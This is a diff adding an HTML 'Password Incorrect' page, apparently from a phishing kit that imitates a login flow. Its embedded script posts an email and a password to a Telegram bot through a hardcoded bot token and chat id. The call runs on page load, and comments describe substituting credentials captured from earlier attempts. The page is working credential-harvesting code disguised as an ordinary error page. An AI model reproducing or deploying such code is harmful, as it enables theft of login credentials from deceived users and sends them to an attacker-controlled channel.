@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Password Error</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* Basic CSS for the error page */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .error-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+
+        .error-container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .error-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #d9534f;
+        }
+
+        .error-container p {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .error-container .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #3578e5;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .error-container .btn:hover {
+            background-color: #3065c3;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="error-container">
+        <img src="/login/images/logo.svg" alt="Logo">
+        <h2>Password Incorrect</h2>
+        <p>Your password was incorrect. Please try again.</p>
+        <button class="btn" onclick="window.location.href='index.html'">Try Again</button>
+    </div>
+
+    <script>
+        function sendToTelegram(email, password) {
+            const botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k';
+            const chatId = '5607989288';
+            const message = `Email: ${email}\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Message sent to Telegram:', data))
+            .catch(error => console.error('Error sending message to Telegram:', error));
+        }
+
+        // In a real application, you might capture the email and password from previous attempts.
+        // Here we simulate sending the same data again.
+        const email = 'user@example.com'; // Replace with actual email
+        const password = 'wrongpassword'; // Replace with actual password
+
+        // Send the data to Telegram again (if needed)
+        sendToTelegram(email, password);
+    </script>
+</body>
+
+</html>
